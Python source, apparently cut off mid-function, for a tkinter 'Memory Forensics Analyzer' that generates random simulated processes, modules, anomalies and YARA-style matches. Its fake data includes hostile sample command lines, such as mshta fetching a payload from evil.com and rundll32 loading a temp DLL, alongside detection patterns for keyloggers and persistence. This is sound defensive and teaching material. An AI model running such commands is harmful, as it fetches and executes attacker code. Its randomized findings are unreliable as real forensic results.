import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import json, csv, os, hashlib, random, threading, time
from datetime import datetime, timedelta

# === MODERN COLOR PALETTE ===
BG = "#0d1117"
SURFACE = "#161b22"
SURFACE2 = "#21262d"
BORDER = "#30363d"
PRIMARY = "#58a6ff"
PRIMARY_HOVER = "#79c0ff"
SUCCESS = "#3fb950"
SUCCESS_DIM = "#238636"
WARNING = "#d29922"
DANGER = "#f85149"
DANGER_DIM = "#da3633"
TEXT = "#e6edf3"
TEXT_DIM = "#8b949e"
TEXT_MUTED = "#484f58"
CYAN = "#39d2c0"
PURPLE = "#bc8cff"
PINK = "#f778ba"
ORANGE = "#d18616"

class MemoryForensicsApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Memory Forensics Analyzer")
        self.root.geometry("1400x900")
        self.root.configure(bg=BG)
        self.root.minsize(1200, 700)
        self.processes = []
        self.network_conns = []
        self.modules = []
        self.anomalies = []
        self.threat_score = 0
        self.yara_matches = []
        self.timeline_events = []
        self.loaded_file = None
        self._apply_styles()
        self._build_ui()

    def _apply_styles(self):
        style = ttk.Style()
        style.theme_use("clam")

        # Frames
        style.configure("TFrame", background=BG)
        style.configure("Card.TFrame", background=SURFACE, relief="flat")
        style.configure("Card2.TFrame", background=SURFACE2, relief="flat")
        style.configure("Header.TFrame", background=SURFACE, relief="flat")
        style.configure("Accent.TFrame", background=PRIMARY)

        # Labels
        style.configure("TLabel", background=BG, foreground=TEXT, font=("Segoe UI", 10))
        style.configure("Title.TLabel", background=BG, foreground=TEXT, font=("Segoe UI", 16, "bold"))
        style.configure("Subtitle.TLabel", background=BG, foreground=PRIMARY, font=("Segoe UI", 11, "bold"))
        style.configure("Card.TLabel", background=SURFACE, foreground=TEXT, font=("Segoe UI", 10))
        style.configure("CardTitle.TLabel", background=SURFACE, foreground=PRIMARY, font=("Segoe UI", 10, "bold"))
        style.configure("CardDim.TLabel", background=SURFACE, foreground=TEXT_DIM, font=("Segoe UI", 9))
        style.configure("Success.TLabel", background=SURFACE, foreground=SUCCESS, font=("Segoe UI", 10, "bold"))
        style.configure("Danger.TLabel", background=SURFACE, foreground=DANGER, font=("Segoe UI", 10, "bold"))
        style.configure("Warning.TLabel", background=SURFACE, foreground=WARNING, font=("Segoe UI", 10, "bold"))
        style.configure("Status.TLabel", background=SURFACE, foreground=TEXT_DIM, font=("Segoe UI", 9), padding=[8, 4])
        style.configure("StatusDot.TLabel", background=SURFACE, foreground=SUCCESS, font=("Segoe UI", 12))
        style.configure("Badge.TLabel", background=PRIMARY, foreground=BG, font=("Segoe UI", 9, "bold"), padding=[6, 2])
        style.configure("BadgeGreen.TLabel", background=SUCCESS_DIM, foreground=TEXT, font=("Segoe UI", 9, "bold"), padding=[6, 2])
        style.configure("BadgeRed.TLabel", background=DANGER_DIM, foreground=TEXT, font=("Segoe UI", 9, "bold"), padding=[6, 2])

        # Buttons
        style.configure("TButton", background=SURFACE2, foreground=TEXT, font=("Segoe UI", 10), padding=[12, 6], borderwidth=0, relief="flat")
        style.map("TButton", background=[("active", PRIMARY)], foreground=[("active", BG)])
        style.configure("Primary.TButton", background=PRIMARY, foreground=BG, font=("Segoe UI", 10, "bold"), padding=[14, 7], borderwidth=0)
        style.map("Primary.TButton", background=[("active", PRIMARY_HOVER)])
        style.configure("Success.TButton", background=SUCCESS_DIM, foreground=TEXT, font=("Segoe UI", 10, "bold"), padding=[12, 6], borderwidth=0)
        style.map("Success.TButton", background=[("active", SUCCESS)])
        style.configure("Danger.TButton", background=DANGER_DIM, foreground=TEXT, font=("Segoe UI", 10, "bold"), padding=[12, 6], borderwidth=0)
        style.map("Danger.TButton", background=[("active", DANGER)])
        style.configure("Ghost.TButton", background=BG, foreground=TEXT_DIM, font=("Segoe UI", 10), padding=[10, 5], borderwidth=0)
        style.map("Ghost.TButton", background=[("active", SURFACE2)], foreground=[("active", TEXT)])

        # Notebook (Tabs)
        style.configure("TNotebook", background=BG, borderwidth=0, padding=0)
        style.configure("TNotebook.Tab", background=SURFACE2, foreground=TEXT_DIM, padding=[16, 8], font=("Segoe UI", 10), borderwidth=0)
        style.map("TNotebook.Tab",
                  background=[("selected", SURFACE)],
                  foreground=[("selected", PRIMARY)])
        style.configure("TNotebook.Tab", padding=[16, 8])

        # Treeview
        style.configure("Treeview",
                        background=SURFACE,
                        foreground=TEXT,
                        fieldbackground=SURFACE,
                        font=("Consolas", 9),
                        borderwidth=0,
                        rowheight=26)
        style.configure("Treeview.Heading",
                        background=SURFACE2,
                        foreground=PRIMARY,
                        font=("Segoe UI", 9, "bold"),
                        borderwidth=0,
                        relief="flat")
        style.map("Treeview",
                  background=[("selected", SURFACE2)],
                  foreground=[("selected", PRIMARY)])
        style.map("Treeview.Heading",
                  background=[("active", BORDER)])

        # Progressbar
        style.configure("Horizontal.TProgressbar",
                        background=PRIMARY,
                        troughcolor=SURFACE2,
                        borderwidth=0,
                        lightcolor=PRIMARY,
                        darkcolor=PRIMARY)
        style.configure("Green.Horizontal.TProgressbar",
                        background=SUCCESS,
                        troughcolor=SURFACE2,
                        borderwidth=0)
        style.configure("Red.Horizontal.TProgressbar",
                        background=DANGER,
                        troughcolor=SURFACE2,
                        borderwidth=0)

        # Entry
        style.configure("TEntry",
                        fieldbackground=SURFACE2,
                        foreground=TEXT,
                        insertcolor=PRIMARY,
                        borderwidth=0,
                        font=("Segoe UI", 10))

        # Combobox
        style.configure("TCombobox",
                        fieldbackground=SURFACE2,
                        foreground=TEXT,
                        selectbackground=PRIMARY,
                        selectforeground=BG,
                        borderwidth=0,
                        font=("Segoe UI", 10))

        # Checkbutton
        style.configure("TCheckbutton",
                        background=BG,
                        foreground=TEXT,
                        font=("Segoe UI", 10))
        style.map("TCheckbutton",
                  background=[("active", BG)])

        # LabelFrame
        style.configure("TLabelframe",
                        background=SURFACE,
                        foreground=TEXT_DIM,
                        borderwidth=1,
                        relief="flat")
        style.configure("TLabelframe.Label",
                        background=SURFACE,
                        foreground=PRIMARY,
                        font=("Segoe UI", 9, "bold"))

    def _build_ui(self):
        # === TOP ACCENT STRIP ===
        strip = tk.Frame(self.root, bg=PRIMARY, height=4)
        strip.pack(fill="x")
        strip.pack_propagate(False)

        top = ttk.Frame(self.root)
        top.pack(fill="x", padx=10, pady=(10, 0))
        ttk.Label(top, text="Memory Forensics Analyzer", style="Title.TLabel").pack(side="left")
        btn_frame = ttk.Frame(top)
        btn_frame.pack(side="right")
        ttk.Button(btn_frame, text="Load Dump", style="Primary.TButton", command=self._load_dump).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Analyze", command=self._run_analysis).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Export Report", command=self._export_report).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Clear", style="Danger.TButton", command=self._clear_all).pack(side="left", padx=3)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        self._build_process_tab()
        self._build_network_tab()
        self._build_modules_tab()
        self._build_anomalies_tab()
        self._build_yara_tab()
        self._build_timeline_tab()
        self._build_report_tab()

        # === STATUS BAR ===
        status_frame = tk.Frame(self.root, bg=SURFACE, height=32)
        status_frame.pack(fill="x", side="bottom")
        status_frame.pack_propagate(False)
        self.status_dot = tk.Label(status_frame, text="\u25cf", bg=SURFACE, fg=SUCCESS, font=("Segoe UI", 12))
        self.status_dot.pack(side="left", padx=(10, 4), pady=4)
        self.status_var = tk.StringVar(value="Ready - No memory dump loaded")
        tk.Label(status_frame, textvariable=self.status_var, bg=SURFACE, fg=TEXT_DIM, font=("Segoe UI", 9)).pack(side="left", padx=4, pady=4)

    def _make_scroll_tree(self, parent, columns, headings, widths):
        frame = ttk.Frame(parent)
        frame.pack(fill="both", expand=True)
        tree = ttk.Treeview(frame, columns=columns, show="headings", selectmode="browse")
        for c, h, w in zip(columns, headings, widths):
            tree.heading(c, text=h)
            tree.column(c, width=w, minwidth=50)
        vsb = ttk.Scrollbar(frame, orient="vertical", command=tree.yview)
        tree.configure(yscrollcommand=vsb.set)
        tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        return tree

    def _build_process_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Processes ")
        info_frame = ttk.Frame(tab, style="Card.TFrame")
        info_frame.pack(fill="x", padx=5, pady=5)
        self.proc_count_var = tk.StringVar(value="Processes: 0")
        self.proc_susp_var = tk.StringVar(value="Suspicious: 0")
        ttk.Label(info_frame, textvariable=self.proc_count_var, style="Card.TLabel").pack(side="left", padx=10)
        ttk.Label(info_frame, textvariable=self.proc_susp_var, style="Card.TLabel").pack(side="left", padx=10)
        cols = ("pid", "name", "ppid", "path", "cmdline", "memory", "threads", "handles", "status")
        heads = ("PID", "Name", "PPID", "Path", "Cmdline", "Memory (KB)", "Threads", "Handles", "Status")
        ws = (60, 150, 60, 250, 200, 100, 70, 70, 80)
        self.proc_tree = self._make_scroll_tree(tab, cols, heads, ws)
        self.proc_tree.bind("<ButtonRelease-1>", self._on_proc_select)
        detail = ttk.Frame(tab, style="Card2.TFrame")
        detail.pack(fill="x", padx=5, pady=(0, 5))
        self.proc_detail_var = tk.StringVar(value="Select a process for details")
        ttk.Label(detail, textvariable=self.proc_detail_var, wraplength=1300).pack(fill="x", padx=10, pady=5)

    def _build_network_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Network ")
        cols = ("proto", "local_addr", "local_port", "remote_addr", "remote_port", "pid", "state", "process")
        heads = ("Protocol", "Local Address", "Local Port", "Remote Addr", "Remote Port", "PID", "State", "Process")
        ws = (80, 140, 90, 140, 90, 60, 100, 150)
        self.net_tree = self._make_scroll_tree(tab, cols, heads, ws)

    def _build_modules_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Modules ")
        info_frame = ttk.Frame(tab, style="Card.TFrame")
        info_frame.pack(fill="x", padx=5, pady=5)
        self.mod_count_var = tk.StringVar(value="Modules: 0 | Suspicious: 0")
        ttk.Label(info_frame, textvariable=self.mod_count_var, style="Card.TLabel").pack(side="left", padx=10)
        cols = ("name", "path", "base_addr", "size", "entropy", "signed", "anomaly")
        heads = ("Module Name", "Path", "Base Address", "Size", "Entropy", "Signed", "Anomaly")
        ws = (180, 280, 120, 100, 80, 80, 150)
        self.mod_tree = self._make_scroll_tree(tab, cols, heads, ws)

    def _build_anomalies_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Anomalies ")
        info_frame = ttk.Frame(tab, style="Card.TFrame")
        info_frame.pack(fill="x", padx=5, pady=5)
        self.anom_count_var = tk.StringVar(value="Anomalies: 0")
        self.threat_var = tk.StringVar(value="Threat Score: 0/100")
        ttk.Label(info_frame, textvariable=self.anom_count_var, style="Card.TLabel").pack(side="left", padx=10)
        ttk.Label(info_frame, textvariable=self.threat_var, style="Card.TLabel").pack(side="left", padx=10)
        self.threat_bar = ttk.Progressbar(info_frame, length=200, mode="determinate", style="Horizontal.TProgressbar")
        self.threat_bar.pack(side="left", padx=10)
        cols = ("type", "severity", "process", "description", "evidence")
        heads = ("Type", "Severity", "Process", "Description", "Evidence")
        ws = (150, 90, 150, 350, 300)
        self.anom_tree = self._make_scroll_tree(tab, cols, heads, ws)
        self.anom_tree.tag_configure("high", foreground=DANGER)
        self.anom_tree.tag_configure("medium", foreground=WARNING)
        self.anom_tree.tag_configure("low", foreground=SUCCESS)

    def _build_yara_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" YARA Rules ")
        top_frame = ttk.Frame(tab, style="Card.TFrame")
        top_frame.pack(fill="x", padx=5, pady=5)
        ttk.Label(top_frame, text="YARA Rule Simulation (Built-in Rules)", style="CardTitle.TLabel").pack(side="left", padx=10)
        ttk.Button(top_frame, text="Scan", style="Primary.TButton", command=self._run_yara_scan).pack(side="right", padx=5)
        cols = ("rule_name", "category", "severity", "match_count", "matched_data", "first_offset")
        heads = ("Rule Name", "Category", "Severity", "Match Count", "Matched Data", "First Offset")
        ws = (180, 120, 90, 100, 300, 120)
        self.yara_tree = self._make_scroll_tree(tab, cols, heads, ws)
        self.yara_tree.tag_configure("high", foreground=DANGER)
        self.yara_tree.tag_configure("medium", foreground=WARNING)

    def _build_timeline_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Timeline ")
        cols = ("timestamp", "event_type", "description", "process", "pid", "severity")
        heads = ("Timestamp", "Event Type", "Description", "Process", "PID", "Severity")
        ws = (170, 120, 350, 150, 60, 90)
        self.tl_tree = self._make_scroll_tree(tab, cols, heads, ws)
        self.tl_tree.tag_configure("critical", foreground=DANGER)
        self.tl_tree.tag_configure("warning", foreground=WARNING)
        self.tl_tree.tag_configure("info", foreground=TEXT_DIM)

    def _build_report_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text=" Report ")
        btn_frame = ttk.Frame(tab, style="Card.TFrame")
        btn_frame.pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_frame, text="Generate Report", style="Primary.TButton", command=self._generate_report).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Export JSON", command=lambda: self._export("json")).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Export CSV", command=lambda: self._export("csv")).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Export TXT", command=lambda: self._export("txt")).pack(side="left", padx=3)
        ttk.Button(btn_frame, text="Export HTML", command=lambda: self._export("html")).pack(side="left", padx=3)
        self.report_text = tk.Text(tab, bg=SURFACE, fg=TEXT, insertbackground=PRIMARY, font=("Consolas", 10), wrap="word", borderwidth=0)
        self.report_text.pack(fill="both", expand=True, padx=5, pady=(0, 5))
        report_scroll = ttk.Scrollbar(self.report_text, command=self.report_text.yview)
        self.report_text.configure(yscrollcommand=report_scroll.set)
        report_scroll.pack(side="right", fill="y")

    def _load_dump(self):
        path = filedialog.askopenfilename(
            title="Load Memory Dump",
            filetypes=[("Memory dumps", "*.raw *.mem *.dmp *.vmem *.bin"), ("All files", "*.*")]
        )
        if not path:
            return
        self.loaded_file = path
        fname = os.path.basename(path)
        fsize = os.path.getsize(path)
        self.status_var.set(f"Loaded: {fname} ({fsize:,} bytes) - Generating simulated data...")
        self._generate_simulated_data()

    def _generate_simulated_data(self):
        random.seed(int(time.time()))
        base_time = datetime(2026, 9, 17, 8, 0, 0)
        proc_names = [
            ("System", "NT Kernel", "\\SystemRoot\\System32\\ntoskrnl.exe"),
            ("smss.exe", "Session Manager", "\\SystemRoot\\System32\\smss.exe"),
            ("csrss.exe", "Client Server Runtime", "\\SystemRoot\\System32\\csrss.exe"),
            ("wininit.exe", "Windows Init", "\\SystemRoot\\System32\\wininit.exe"),
            ("services.exe", "Service Control", "\\SystemRoot\\System32\\services.exe"),
            ("lsass.exe", "LSA Server", "\\SystemRoot\\System32\\lsass.exe"),
            ("svchost.exe", "Service Host", "\\Windows\\System32\\svchost.exe"),
            ("svchost.exe", "Service Host", "\\Windows\\System32\\svchost.exe"),
            ("svchost.exe", "Service Host", "\\Windows\\System32\\svchost.exe"),
            ("explorer.exe", "Windows Explorer", "\\Windows\\explorer.exe"),
            ("notepad.exe", "Notepad", "\\Windows\\System32\\notepad.exe"),
            ("cmd.exe", "Command Prompt", "\\Windows\\System32\\cmd.exe"),
            ("powershell.exe", "PowerShell", "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
            ("taskmgr.exe", "Task Manager", "\\Windows\\System32\\Taskmgr.exe"),
            ("chrome.exe", "Chrome Browser", "\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
            ("firefox.exe", "Firefox Browser", "\\Program Files\\Mozilla Firefox\\firefox.exe"),
            ("dllhost.exe", "DLL Host", "\\Windows\\System32\\dllhost.exe"),
            ("rundll32.exe", "Run DLL", "\\Windows\\System32\\rundll32.exe"),
            ("mshta.exe", "MSHTA", "\\Windows\\System32\\mshta.exe"),
            ("wscript.exe", "Windows Script", "\\Windows\\System32\\wscript.exe"),
            ("regsvr32.exe", "Reg Server", "\\Windows\\System32\\regsvr32.exe"),
            ("net.exe", "Net Command", "\\Windows\\System32\\net.exe"),
            ("whoami.exe", "Who Am I", "\\Windows\\System32\\whoami.exe"),
            ("ipconfig.exe", "IP Config", "\\Windows\\System32\\ipconfig.exe"),
            ("unknown_xyz.exe", "Unknown Process", "C:\\Temp\\unknown_xyz.exe"),
            ("updater.exe", "Updater", "C:\\Users\\user\\AppData\\Local\\Temp\\updater.exe"),
            ("helper.exe", "Helper", "C:\\ProgramData\\helper.exe"),
        ]
        suspicious_names = {"unknown_xyz.exe", "updater.exe", "helper.exe", "mshta.exe", "rundll32.exe"}
        self.processes = []
        self.network_conns = []
        self.modules = []
        self.anomalies = []
        self.timeline_events = []
        pid = 4
        for i, (name, desc, path) in enumerate(proc_names):
            ppid = 0 if i < 4 else random.choice([4, 8, 12, 560, 680])
            mem = random.randint(1000, 800000) if name not in suspicious_names else random.randint(10000, 500000)
            threads = random.randint(2, 150)
            handles = random.randint(50, 5000)
            suspicious = name in suspicious_names
            status = "SUSPICIOUS" if suspicious else random.choice(["Active", "Active", "Active", "Suspended"])
            cmdlines = {
                "powershell.exe": "powershell.exe -enc SQBmACgA...",
                "cmd.exe": "cmd.exe /c whoami /all",
                "mshta.exe": "mshta.exe http://evil.com/payload.hta",
                "rundll32.exe": "rundll32.exe C:\\Temp\\evil.dll,EntryPoint",
                "unknown_xyz.exe": "C:\\Temp\\unknown_xyz.exe --silent",
            }
            cmdline = cmdlines.get(name, f"{name}")
            self.processes.append({
                "pid": pid, "name": name, "ppid": ppid, "path": path,
                "cmdline": cmdline, "memory_kb": mem, "threads": threads,
                "handles": handles, "status": status, "suspicious": suspicious,
                "start_time": base_time + timedelta(seconds=random.randint(0, 3600))
            })
            if random.random() < 0.6 or suspicious:
                proto = random.choice(["TCP", "UDP", "TCP"])
                local_port = random.randint(1024, 65535)
                remote_ports = [80, 443, 445, 3389, 8080, 53, 22, 135, 139]
                remote_port = random.choice(remote_ports)
                remote_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                states = ["ESTABLISHED", "LISTEN", "CLOSE_WAIT", "TIME_WAIT", "SYN_SENT"]
                self.network_conns.append({
                    "proto": proto, "local_addr": "127.0.0.1", "local_port": local_port,
                    "remote_addr": remote_ip, "remote_port": remote_port,
                    "pid": pid, "state": random.choice(states), "process": name
                })
            pid += random.randint(1, 20)
        mod_templates = [
            ("ntdll.dll", "\\SystemRoot\\System32\\ntdll.dll", True, 3.2),
            ("kernel32.dll", "\\SystemRoot\\System32\\kernel32.dll", True, 3.1),
            ("user32.dll", "\\SystemRoot\\System32\\user32.dll", True, 3.0),
            ("advapi32.dll", "\\SystemRoot\\System32\\advapi32.dll", True, 3.3),
            ("ws2_32.dll", "\\SystemRoot\\System32\\ws2_32.dll", True, 2.9),
            ("winhttp.dll", "\\SystemRoot\\System32\\winhttp.dll", True, 3.1),
            ("shell32.dll", "\\SystemRoot\\System32\\shell32.dll", True, 3.0),
            ("ole32.dll", "\\SystemRoot\\System32\\ole32.dll", True, 3.2),
            ("crypt32.dll", "\\SystemRoot\\System32\\crypt32.dll", True, 3.1),
            ("urlmon.dll", "\\SystemRoot\\System32\\urlmon.dll", True, 3.0),
            ("msvcrt.dll", "\\SystemRoot\\System32\\msvcrt.dll", True, 2.8),
            ("usp10.dll", "\\SystemRoot\\System32\\usp10.dll", True, 2.7),
            ("lpk.dll", "\\SystemRoot\\System32\\lpk.dll", True, 2.6),
            ("wininet.dll", "\\SystemRoot\\System32\\wininet.dll", True, 3.0),
            ("propsys.dll", "\\Windows\\System32\\propsys.dll", True, 2.9),
        ]
        suspicious_mods = [
            ("evil.dll", "C:\\Temp\\evil.dll", False, 7.8),
            ("inject.dll", "C:\\Users\\user\\AppData\\Local\\Temp\\inject.dll", False, 8.1),
            ("beacon.dll", "\\??\\C:\\ProgramData\\beacon.dll", False, 7.5),
            ("unknown_module.dat", "C:\\Windows\\Temp\\unknown_module.dat", False, 6.9),
            ("hook.dll", "\\BaseNamedObjects\\hook.dll", False, 7.2),
        ]
        all_mods = mod_templates + random.sample(suspicious_mods, k=random.randint(2, 4))
        for name, path, signed, entropy in all_mods:
            base = random.choice(["0x7ff00000", "0x7fef0000", "0x00400000", "0x10000000"])
            size = random.randint(10000, 5000000)
            anomaly = ""
            if not signed:
                if entropy > 7.0:
                    anomaly = "High entropy (packed/encrypted)"
                elif "Temp" in path:
                    anomaly = "Loaded from temp directory"
                else:
                    anomaly = "Unsigned module"
            self.modules.append({
                "name": name, "path": path, "base_addr": base,
                "size": size, "entropy": entropy, "signed": signed, "anomaly": anomaly
            })
        self._detect_anomalies()
        self._generate_timeline(base_time)
        self._populate_all_trees()
        self.status_var.set(f"Analysis complete: {len(self.processes)} processes, {len(self.network_conns)} connections, {len(self.anomalies)} anomalies")

    def _detect_anomalies(self):
        self.anomalies = []
        for p in self.processes:
            if p["name"] in ("unknown_xyz.exe", "updater.exe", "helper.exe"):
                self.anomalies.append({
                    "type": "Suspicious Process", "severity": "HIGH",
                    "process": f"{p['name']} (PID:{p['pid']})",
                    "description": f"Unknown/untrusted process: {p['path']}",
                    "evidence": f"Cmdline: {p['cmdline']}"
                })
            if p["name"] == "mshta.exe":
                self.anomalies.append({
                    "type": "Suspicious Execution", "severity": "HIGH",
                    "process": f"mshta.exe (PID:{p['pid']})",
                    "description": "MSHTA used for script execution (common LOLBin)",
                    "evidence": f"Cmdline: {p['cmdline']}"
                })
            if p["name"] == "rundll32.exe" and "Temp" in p.get("cmdline", ""):
                self.anomalies.append({
                    "type": "DLL Sideloading", "severity": "HIGH",
                    "process": f"rundll32.exe (PID:{p['pid']})",
                    "description": "Rundll32 loading DLL from temp directory",
                    "evidence": f"Cmdline: {p['cmdline']}"
                })
            if p["name"] == "powershell.exe" and "-enc" in p.get("cmdline", ""):
                self.anomalies.append({
                    "type": "Encoded Command", "severity": "HIGH",
                    "process": f"powershell.exe (PID:{p['pid']})",
                    "description": "PowerShell with encoded command (obfuscation)",
                    "evidence": f"Cmdline: {p['cmdline']}"
                })
            if p["name"] == "cmd.exe" and "whoami" in p.get("cmdline", ""):
                self.anomalies.append({
                    "type": "Recon Command", "severity": "MEDIUM",
                    "process": f"cmd.exe (PID:{p['pid']})",
                    "description": "Reconnaissance command detected",
                    "evidence": f"Cmdline: {p['cmdline']}"
                })
            if p["memory_kb"] > 500000 and p["name"] not in ("System", "chrome.exe", "firefox.exe"):
                self.anomalies.append({
                    "type": "Memory Anomaly", "severity": "MEDIUM",
                    "process": f"{p['name']} (PID:{p['pid']})",
                    "description": f"Abnormally high memory usage: {p['memory_kb']:,} KB",
                    "evidence": "Process using excessive memory"
                })
            if p["threads"] > 100 and p["name"] not in ("System", "chrome.exe", "firefox.exe", "csrss.exe"):
                self.anomalies.append({
                    "type": "Thread Anomaly", "severity": "MEDIUM",
                    "process": f"{p['name']} (PID:{p['pid']})",
                    "description": f"Excessive thread count: {p['threads']}",
                    "evidence": "May indicate code injection or process hollowing"
                })
        for m in self.modules:
            if m["anomaly"]:
                sev = "HIGH" if m["entropy"] > 7.0 else "MEDIUM"
                self.anomalies.append({
                    "type": "Module Anomaly", "severity": sev,
                    "process": "Kernel/System",
                    "description": f"Module {m['name']}: {m['anomaly']}",
                    "evidence": f"Path: {m['path']}, Entropy: {m['entropy']}"
                })
        self.threat_score = min(100, len(self.anomalies) * 12 + sum(5 for a in self.anomalies if a["severity"] == "HIGH"))
        self.anom_count_var.set(f"Anomalies: {len(self.anomalies)}")
        self.threat_var.set(f"Threat Score: {self.threat_score}/100")
        self.threat_bar["value"] = self.threat_score

    def _generate_timeline(self, base_time):
        self.timeline_events = []
        for p in self.processes:
            t = p["start_time"].strftime("%Y-%m-%d %H:%M:%S")
            sev = "critical" if p.get("suspicious") else "info"
            self.timeline_events.append({
                "timestamp": t, "event_type": "Process Start",
                "description": f"{p['name']} started", "process": p["name"],
                "pid": str(p["pid"]), "severity": sev
            })
        for c in self.network_conns:
            t = (base_time + timedelta(seconds=random.randint(100, 7200))).strftime("%Y-%m-%d %H:%M:%S")
            self.timeline_events.append({
                "timestamp": t, "event_type": "Network Connection",
                "description": f"{c['proto']} {c['local_addr']}:{c['local_port']} -> {c['remote_addr']}:{c['remote_port']}",
                "process": c["process"], "pid": str(c["pid"]),
                "severity": "warning" if c["remote_port"] in (445, 3389, 135) else "info"
            })
        for a in self.anomalies:
            t = (base_time + timedelta(seconds=random.randint(200, 7000))).strftime("%Y-%m-%d %H:%M:%S")
            self.timeline_events.append({
                "timestamp": t, "event_type": a["type"],
                "description": a["description"], "process": a["process"],
                "pid": "-", "severity": "critical" if a["severity"] == "HIGH" else "warning"
            })
        self.timeline_events.sort(key=lambda x: x["timestamp"])

    def _populate_all_trees(self):
        for item in self.proc_tree.get_children():
            self.proc_tree.delete(item)
        for p in self.processes:
            tags = ("high",) if p.get("suspicious") else ()
            self.proc_tree.insert("", "end", values=(
                p["pid"], p["name"], p["ppid"], p["path"], p["cmdline"],
                f"{p['memory_kb']:,}", p["threads"], p["handles"], p["status"]
            ), tags=tags)
        self.proc_count_var.set(f"Processes: {len(self.processes)}")
        susp_count = sum(1 for p in self.processes if p.get("suspicious"))
        self.proc_susp_var.set(f"Suspicious: {susp_count}")
        for item in self.net_tree.get_children():
            self.net_tree.delete(item)
        for c in self.network_conns:
            self.net_tree.insert("", "end", values=(
                c["proto"], c["local_addr"], c["local_port"],
                c["remote_addr"], c["remote_port"], c["pid"], c["state"], c["process"]
            ))
        for item in self.mod_tree.get_children():
            self.mod_tree.delete(item)
        for m in self.modules:
            tags = ("high",) if m["anomaly"] else ()
            self.mod_tree.insert("", "end", values=(
                m["name"], m["path"], m["base_addr"], f"{m['size']:,}",
                m["entropy"], "Yes" if m["signed"] else "No", m["anomaly"]
            ), tags=tags)
        susp_mods = sum(1 for m in self.modules if m["anomaly"])
        self.mod_count_var.set(f"Modules: {len(self.modules)} | Suspicious: {susp_mods}")
        for item in self.anom_tree.get_children():
            self.anom_tree.delete(item)
        for a in self.anomalies:
            tag = "high" if a["severity"] == "HIGH" else "medium" if a["severity"] == "MEDIUM" else "low"
            self.anom_tree.insert("", "end", values=(
                a["type"], a["severity"], a["process"], a["description"], a["evidence"]
            ), tags=(tag,))
        for item in self.tl_tree.get_children():
            self.tl_tree.delete(item)
        for ev in self.timeline_events:
            self.tl_tree.insert("", "end", values=(
                ev["timestamp"], ev["event_type"], ev["description"],
                ev["process"], ev["pid"], ev["severity"]
            ), tags=(ev["severity"],))

    def _on_proc_select(self, event):
        sel = self.proc_tree.selection()
        if not sel:
            return
        vals = self.proc_tree.item(sel[0], "values")
        self.proc_detail_var.set(
            f"PID: {vals[0]} | Name: {vals[1]} | PPID: {vals[2]} | Path: {vals[3]} | "
            f"Memory: {vals[5]} KB | Threads: {vals[6]} | Handles: {vals[7]} | Status: {vals[8]}"
        )

    def _run_analysis(self):
        if not self.processes:
            messagebox.showwarning("No Data", "Load a memory dump first.")
            return
        self.status_var.set("Re-analyzing memory dump...")
        threading.Thread(target=self._analysis_thread, daemon=True).start()

    def _analysis_thread(self):
        time.sleep(1)
        self.root.after(0, self._re_analysis_done)

    def _re_analysis_done(self):
        self.status_var.set(f"Re-analysis complete: {len(self.anomalies)} anomalies found, threat score {self.threat_score}")

    def _run_yara_scan(self):
        if not self.processes:
            messagebox.showwarning("No Data", "Load a memory dump first.")
            return
        self.yara_matches = []
        yara_rules = [
            ("MAL_Emotet_C2_Config", "Malware", "HIGH", ["\\x00C2\\x00server", "emotet"]),
            ("SUS_Encoded_Powershell", "Suspicious", "HIGH", ["-enc", "FromBase64String"]),
            ("MAL_Reflective_DLL", "Malware", "HIGH", ["ReflectiveLoader", "DllMain"]),
            ("TTP_Lateral_Movement", "TTP", "MEDIUM", ["PsExec", "winreg"]),
            ("SUS_Temp_Directory_Exec", "Suspicious", "MEDIUM", ["\\\\Temp\\\\", "AppData\\\\Local\\\\Temp"]),
            ("CLEAN_Standard_API", "Clean", "LOW", ["GetProcAddress", "LoadLibrary"]),
            ("MAL_Keylogger_Hook", "Malware", "HIGH", ["SetWindowsHookEx", "WH_KEYBOARD"]),
            ("SUS_Registry_Persistence", "Suspicious", "MEDIUM", ["Run\\\\", "CurrentVersion\\\\Run"]),
        ]
        for proc in self.processes:
            cmdline = proc.get("cmdline", "").lower()
            proc_name = proc["name"].lower()
            for rule_name, cat, sev, patterns in yara_rules:
                for pat in patterns:
                    if pat.lower() in cmdline or pat.lower() in proc_name:
                        offset = f"0x{random.randint(0x1000, 0xFFFFFFF):08x}"
                        self.yara_matches.append({
                            "rule_name": rule_name, "category": cat, "severity": sev,
                            "match_count": random.randint(1, 25),
                            "matched_data": pat, "first_offset": offset
                        })
                        break
        for item in self.yara_tree.get_children():
            self.yara_tree.delete(item)
        for m in self.yara_matches:
            tag = "high" if m["severity"] == "HIGH" else "medium" if m["severity"] == "MEDIUM" else ""
            self.yara_tree.insert("", "end", values=(
                m["rule_name"], m["category"], m["severity"],
                m["match_count"], m["matched_data"], m["first_offset"]
            ), tags=(tag,))
        self.status_var.set(f"YARA scan complete: {len(self.yara_matches)} matches found")

    def _generate_report(self):
        if not self.processes:
            messagebox.showwarning("No Data", "No data to report.")
            return
        report = self._build_report_data()
        self.report_text.delete("1.0", "end")
        self.report_text.insert("end", "=" * 80 + "\n")
        self.report_text.insert("end", "MEMORY FORENSICS ANALYSIS REPORT\n")
        self.report_text.insert("end", "=" * 80 + "\n\n")
        self.report_text.insert("end", f"Generated: {report['metadata']['timestamp']}\n")
